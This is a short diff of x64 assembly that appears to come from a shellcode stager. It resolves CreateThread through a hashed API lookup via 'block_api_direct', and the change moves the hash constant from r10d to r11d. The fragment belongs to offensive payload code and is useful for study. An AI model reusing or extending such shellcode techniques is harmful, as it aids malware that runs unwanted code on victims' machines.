@@ -37,7 +37,7 @@ start:
   lea r8, [rel threadstart]                   ; lpStartAddr = &threadstart
   pop rdx                                     ; lpThreadAttributes = NULL
 
-  mov r10d, 0x221b4546                        ; hash( "kernel32.dll", "CreateThread" )
+  mov r11d, 0x221b4546                        ; hash( "kernel32.dll", "CreateThread" )
   call block_api_direct                       ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
   add rsp, 40                                 ; RSP will be off by -40 after each call to block_api
   ret
